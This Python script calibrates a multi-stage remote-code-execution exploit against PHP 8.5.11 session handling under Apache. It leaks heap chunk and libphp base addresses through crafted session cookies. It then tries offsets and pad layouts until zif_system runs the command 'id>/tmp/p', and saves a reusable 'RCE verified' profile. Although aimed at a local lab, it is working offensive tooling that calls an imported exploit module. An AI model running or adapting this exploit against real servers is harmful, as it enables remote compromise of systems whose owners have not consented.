#!/usr/bin/env python3
"""Calibrate the session-chain heap profile for this local libphp build.

Adapts the devploit calibration loop:
  1. stage-1 probe with N=900 / forge length 48; the leaked cookie's vNNNN
     field identifies the stale-block index;
  2. retry that index with forge lengths 63/79/87/95 for a 4096-byte cookie;
  3. sweep stage-2 T=350..460 with value length 16;
  4. try stage-3 htdata offsets and pad layouts until the proof file appears.

Usage:
  bash lab/start-apache-session.sh
  python3 calibrate_session.py -u http://127.0.0.1:18091/index.php \
      --proof-file /tmp/p --out profiles/php-8.5.11-local.json
"""
from __future__ import annotations

import argparse
import json
import os
import re
import time
from collections import Counter

from session_exploit import (
    DTOR_OFFSET,
    HTDATA_OFFSET,
    SID,
    ZIF_OFFSET,
    SessionExploit,
    Target,
    build_multipart,
    libphp_base_from_cookie,
    parse_cookie,
)


def chunk_base(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    counts: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x10000 < v < 0x0001000000000000:
            counts[v & ~0x1FFFFF] += 1
    if not counts:
        return 0
    base, count = counts.most_common(1)[0]
    return base if count >= 8 else 0


def find_stage1(ex: SessionExploit) -> tuple[int, int, int]:
    ex.rotate()
    raw = ex.stage1_cookie(900, 48)
    ex.t.log(f"[*] stage1 probe cookie={len(raw)} bytes")
    m = re.search(rb"v(\d{4})", raw)
    if not m:
        ex.t.log("[!] probe did not reveal vNNNN")
        return 0, 0, 0
    index = int(m.group(1))
    ex.t.log(f"[*] probe stale block index = {index}")
    for forge_len in (63, 79, 87, 95):
        ex.rotate()
        cookie = ex.stage1_cookie(index, forge_len)
        base = chunk_base(cookie)
        ex.t.log(f"[*] stage1 N={index} forge={forge_len} "
                 f"cookie={len(cookie)} base={base:#x}")
        if base and len(cookie) >= 1000:
            return base, index, forge_len
    return 0, index, 0


def find_stage2(ex: SessionExploit,
                dtor: int) -> tuple[int, int]:
    for t_index in range(350, 461):
        ex.rotate()
        cookie = ex.stage2_cookie(t_index, 16)
        base = libphp_base_from_cookie(cookie, dtor)
        if base:
            ex.t.log(f"[*] stage2 T={t_index} libphp={base:#x}")
            return base, t_index
        if t_index % 10 == 0:
            ex.t.log(f"[*] stage2 sweep T={t_index} cookie={len(cookie)}")
    return 0, 0


def try_stage3(ex: SessionExploit, chunk: int, libphp: int, zif: int,
               proof: str) -> tuple[bool, int | None, str | None]:
    layouts = []
    for off in (0x690D8, 0x6E0D8, 0x5404A):
        layouts.append((f"{off:#x}/lab", off, False))
        layouts.append((f"{off:#x}/bookworm", off, True))
    for name, off, carrier in layouts:
        try:
            os.unlink(proof)
        except OSError:
            pass
        ex.rotate()
        ex.carrier = carrier
        ex.stage3_pads = ([(31, 31)] * 6 if carrier
                          else [(8, 7)] + [(7, 7)] * 5)
        try:
            ex.stage3(chunk + off, libphp + zif)
        except OSError as exc:
            ex.t.log(f"[-] stage3 {name}: {exc}")
        time.sleep(0.8)
        try:
            data = open(proof, "rb").read().decode("latin1").strip()
        except OSError:
            data = ""
        if data:
            ex.t.log(f"[+] stage3 {name}: {data}")
            return True, off, ("bookworm" if carrier else "lab")
        ex.t.log(f"[-] stage3 {name}: no proof")
    return False, None, None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--proof-file", default="/tmp/p")
    ap.add_argument("--out", default="profiles/php-8.5.11-local.json")
    ap.add_argument("--zif-offset", type=lambda s: int(s, 0),
                    default=ZIF_OFFSET)
    ap.add_argument("--dtor-offset", type=lambda s: int(s, 0),
                    default=DTOR_OFFSET)
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--timeout", type=float, default=60.0)
    args = ap.parse_args()

    target = Target(args.url, timeout=args.timeout, verbose=True)
    ex = SessionExploit(target, "id>/tmp/p", zif_offset=args.zif_offset,
                        dtor_offset=args.dtor_offset,
                        htdata_offset=HTDATA_OFFSET,
                        poison_mode="big", huge_mb=args.huge_mb,
                        verbose=True)

    chunk, stage1_n, forge_len = find_stage1(ex)
    if not chunk:
        print("STAGE1_FAILED")
        return 1
    libphp, stage2_t = find_stage2(ex, args.dtor_offset)
    if not libphp:
        print("STAGE2_FAILED")
        return 1
    rce, htdata, pads = try_stage3(ex, chunk, libphp, args.zif_offset,
                                   args.proof_file)
    profile = {
        "name": "php-8.5.11-local-minimal",
        "php_version": "8.5.11",
        "branch": "8.5",
        "sapi": "apache2handler",
        "arch": "amd64",
        "verified": rce,
        "rce": rce,
        "libphp": {
            "zif_system": hex(args.zif_offset),
            "zval_ptr_dtor": hex(args.dtor_offset),
            "htdata": hex(htdata) if htdata is not None else None,
        },
        "stages": {
            "stage1_n": stage1_n,
            "stage1_forge_len": forge_len,
            "stage2_t": stage2_t,
            "stage2_v": 16,
            "stage3_pads": pads,
            "stage3_carrier": pads == "bookworm" if pads else None,
        },
        "measured": {
            "chunk_base": hex(chunk),
            "libphp_base": hex(libphp),
        },
        "status": "RCE verified" if rce else "leaks calibrated; stage 3 failed",
    }
    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(profile, fh, indent=2)
    print(json.dumps(profile, indent=2))
    print(f"profile written: {args.out}")
    return 0 if rce else 2


if __name__ == "__main__":
    raise SystemExit(main())
